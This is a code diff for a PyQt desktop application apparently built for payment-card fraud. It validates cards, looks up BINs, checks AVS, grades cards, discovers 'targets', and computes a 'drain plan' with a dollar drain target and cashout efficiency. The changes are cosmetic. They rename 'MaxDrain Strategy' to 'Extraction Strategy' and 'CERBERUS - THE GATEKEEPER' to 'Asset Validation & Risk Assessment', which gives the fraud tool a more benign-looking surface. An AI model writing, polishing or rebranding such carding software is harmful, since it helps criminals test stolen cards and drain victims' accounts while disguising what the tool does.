@@ -66,14 +66,14 @@ class DrainPlanDialog(QDialog):
     
     def __init__(self, plan_text: str, parent=None):
         super().__init__(parent)
-        self.setWindowTitle("MaxDrain Strategy Plan")
+        self.setWindowTitle("Extraction Strategy Plan")
         self.setMinimumSize(700, 600)
         
         layout = QVBoxLayout(self)
         
-        header = QLabel("MaxDrain Strategy")
-        header.setFont(QFont("Segoe UI", 16, QFont.Weight.Bold))
-        header.setStyleSheet("color: #ff9800;")
+        header = QLabel("Extraction Strategy")
+        header.setFont(QFont("Inter", 16, QFont.Weight.Bold))
+        header.setStyleSheet("color: #E6A817;")
         header.setAlignment(Qt.AlignmentFlag.AlignCenter)
         layout.addWidget(header)
         
@@ -257,13 +257,13 @@ class CerberusApp(QMainWindow):
         main_layout.setContentsMargins(12, 12, 12, 12)
         
         # Header
-        header = QLabel("🛡️ CERBERUS - THE GATEKEEPER")
-        header.setFont(QFont("JetBrains Mono", 20, QFont.Weight.Bold))
+        header = QLabel("ASSET VALIDATION & RISK ASSESSMENT")
+        header.setFont(QFont("Inter", 20, QFont.Weight.Bold))
         header.setAlignment(Qt.AlignmentFlag.AlignCenter)
-        header.setStyleSheet("color: #00bcd4; margin-bottom: 2px; font-family: 'JetBrains Mono', 'Consolas', monospace;")
+        header.setStyleSheet("color: #3A75C4; margin-bottom: 2px;")
         main_layout.addWidget(header)
         
-        subtitle = QLabel("Zero-Touch Card Validation + BIN Intelligence + Target Discovery")
+        subtitle = QLabel("Card Validation + BIN Intelligence + Target Discovery")
         subtitle.setAlignment(Qt.AlignmentFlag.AlignCenter)
         subtitle.setStyleSheet("color: #556; font-size: 11px;")
         main_layout.addWidget(subtitle)
@@ -346,7 +346,7 @@ class CerberusApp(QMainWindow):
         self.validate_btn.setFont(QFont("Segoe UI", 12, QFont.Weight.Bold))
         self.validate_btn.setStyleSheet("""
             QPushButton {
-                background-color: #00bcd4;
+                background-color: #3A75C4;
                 color: white;
                 border: none;
                 border-radius: 8px;
@@ -401,7 +401,7 @@ class CerberusApp(QMainWindow):
         layout.addLayout(btn_layout)
         
         # Strategy button (shown after LIVE validation)
-        self.strategy_btn = QPushButton("MaxDrain Strategy")
+        self.strategy_btn = QPushButton("Extraction Strategy")
         self.strategy_btn.setMinimumHeight(40)
         self.strategy_btn.setFont(QFont("Segoe UI", 11, QFont.Weight.Bold))
         self.strategy_btn.setVisible(False)
@@ -456,7 +456,7 @@ class CerberusApp(QMainWindow):
         stats_layout.addStretch()
         
         export_btn = QPushButton("Export Results")
-        export_btn.setStyleSheet("color: #00bcd4; background: transparent; border: 1px solid #00bcd4; border-radius: 4px; padding: 4px 10px;")
+        export_btn.setStyleSheet("color: #3A75C4; background: transparent; border: 1px solid #3A75C4; border-radius: 4px; padding: 4px 10px;")
         export_btn.clicked.connect(self.export_results)
         stats_layout.addWidget(export_btn)
         
@@ -502,7 +502,7 @@ class CerberusApp(QMainWindow):
 
         bin_lookup_btn = QPushButton("🔍 Lookup BIN")
         bin_lookup_btn.setMinimumHeight(36)
-        bin_lookup_btn.setStyleSheet("background: #00bcd4; color: white; border: none; border-radius: 6px; padding: 0 16px; font-weight: bold;")
+        bin_lookup_btn.setStyleSheet("background: #3A75C4; color: white; border: none; border-radius: 6px; padding: 0 16px; font-weight: bold;")
         bin_lookup_btn.clicked.connect(self._lookup_bin)
         input_row.addWidget(bin_lookup_btn)
 
@@ -660,7 +660,7 @@ class CerberusApp(QMainWindow):
 
         load_btn = QPushButton("📋 Load Database")
         load_btn.setMinimumHeight(32)
-        load_btn.setStyleSheet("background: #00bcd4; color: white; border: none; border-radius: 6px; padding: 0 14px; font-weight: bold;")
+        load_btn.setStyleSheet("background: #3A75C4; color: white; border: none; border-radius: 6px; padding: 0 14px; font-weight: bold;")
         load_btn.clicked.connect(self._load_target_database)
         filter_row.addWidget(load_btn)
         layout.addLayout(filter_row)
@@ -692,7 +692,7 @@ class CerberusApp(QMainWindow):
         disco_row.addWidget(self.disco_max)
         disco_btn = QPushButton("🚀 Discover New Targets")
         disco_btn.setMinimumHeight(32)
-        disco_btn.setStyleSheet("background: #ff6b35; color: white; border: none; border-radius: 6px; padding: 0 14px; font-weight: bold;")
+        disco_btn.setStyleSheet("background: #E6A817; color: white; border: none; border-radius: 6px; padding: 0 14px; font-weight: bold;")
         disco_btn.clicked.connect(self._run_discovery)
         disco_row.addWidget(disco_btn)
         disco_layout.addLayout(disco_row)
@@ -825,7 +825,7 @@ class CerberusApp(QMainWindow):
         btn_row = QHBoxLayout()
         avs_btn = QPushButton("🏠 Check AVS")
         avs_btn.setMinimumHeight(36)
-        avs_btn.setStyleSheet("background: #00bcd4; color: white; border: none; border-radius: 6px; padding: 0 14px; font-weight: bold;")
+        avs_btn.setStyleSheet("background: #3A75C4; color: white; border: none; border-radius: 6px; padding: 0 14px; font-weight: bold;")
         avs_btn.clicked.connect(self._check_avs)
         btn_row.addWidget(avs_btn)
 
@@ -837,7 +837,7 @@ class CerberusApp(QMainWindow):
 
         grade_btn = QPushButton("⭐ Grade Card")
         grade_btn.setMinimumHeight(36)
-        grade_btn.setStyleSheet("background: #ff6b35; color: white; border: none; border-radius: 6px; padding: 0 14px; font-weight: bold;")
+        grade_btn.setStyleSheet("background: #E6A817; color: white; border: none; border-radius: 6px; padding: 0 14px; font-weight: bold;")
         grade_btn.clicked.connect(self._grade_card)
         btn_row.addWidget(grade_btn)
 
@@ -1027,7 +1027,7 @@ class CerberusApp(QMainWindow):
                         plan_text = format_drain_plan(self._last_drain_plan)
                         self.strategy_btn.setVisible(True)
                         self.strategy_btn.setText(
-                            f"MaxDrain Strategy — ${self._last_drain_plan.total_drain_target:,.0f} "
+                            f"Extraction Strategy — ${self._last_drain_plan.total_drain_target:,.0f} "
                             f"({self._last_drain_plan.cashout_efficiency*100:.0f}% cashout)"
                         )
                     except Exception as e:
@@ -1289,7 +1289,7 @@ def main():
     splash = None
     try:
         from titan_splash import show_titan_splash
-        splash = show_titan_splash(app, "CERBERUS VALIDATION ENGINE", "#00bcd4")
+        splash = show_titan_splash(app, "ASSET VALIDATION ENGINE", "#3A75C4")
     except Exception:
         pass
     
